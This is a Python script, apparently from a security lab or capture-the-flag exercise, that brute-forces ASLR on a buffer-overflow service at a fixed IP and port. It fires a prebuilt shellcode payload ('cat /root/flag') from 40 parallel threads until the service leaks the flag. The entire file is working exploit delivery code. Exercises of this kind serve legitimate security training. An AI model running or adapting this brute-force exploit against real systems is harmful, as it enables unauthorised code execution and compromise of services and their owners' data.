#!/usr/bin/python3
# Fast parallel ASLR brute force for the Level 3 (Task 4) target on :9092.
#
# Faster than the bash version because it keeps the payload in memory and reopens
# sockets directly instead of spawning `cat` + `nc` for every attempt, and it
# runs many attempts concurrently so network round-trips overlap.
#
# Build `badfile` first with exploit.py (shellcode = `cat /root/flag`, and a
# `ret` chosen from THIS target's own probed addresses). Then:
#
#   ./brute-force.py               # defaults to 10.1.26.9 9092
#   ./brute-force.py HOST PORT     # override target (e.g. for testing)
import socket, sys, threading, time, re

HOST = sys.argv[1] if len(sys.argv) > 1 else "10.1.26.9"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9092
WORKERS = 40

payload = open("badfile", "rb").read()
BANNER = re.compile(rb"Starting stack|Input size|Frame Pointer|Buffer.?s address|Returned Properly|Got a connection")

hit = threading.Event()
flag = [None]
tries = [0]
lock = threading.Lock()
t0 = time.time()

def recv_all(s, t=0.5):
    s.settimeout(t)
    data = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            data += c
    except socket.timeout:
        pass
    return data

def attempt():
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((HOST, PORT))
        s.sendall(payload)
        try:
            s.shutdown(socket.SHUT_WR)
        except OSError:
            pass
        out = recv_all(s)
        s.close()
    except OSError:
        return
    with lock:
        tries[0] += 1
    # strip banner lines; anything left is the flag
    rest = b"\n".join(l for l in out.splitlines() if l.strip() and not BANNER.search(l))
    if rest:
        flag[0] = rest.decode(errors="replace").strip()
        hit.set()

def worker():
    while not hit.is_set():
        attempt()

print(f"Brute forcing {HOST}:{PORT} with {WORKERS} workers (Ctrl-C to stop)...")
for _ in range(WORKERS):
    threading.Thread(target=worker, daemon=True).start()
try:
    while not hit.wait(timeout=5):
        print(f"  ...still trying, {tries[0]} attempts, {int(time.time() - t0)}s elapsed")
except KeyboardInterrupt:
    sys.exit(1)
print(f"=== HIT after {int(time.time() - t0)}s / {tries[0]} attempts ===")
print(flag[0])
